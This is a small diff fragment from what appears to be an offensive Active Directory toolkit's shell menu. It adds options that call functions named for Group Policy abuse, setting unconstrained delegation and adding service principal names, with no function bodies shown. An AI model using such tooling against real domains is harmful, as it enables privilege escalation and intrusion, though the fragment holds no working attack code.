+        modif_menu;;
+
+        9)
+        pygpo_abuse
+        modif_menu;;
+
+        10)
+        add_unconstrained
+        modif_menu;;
+
+        11)
+        add_spn
         modif_menu;;
 
         back)
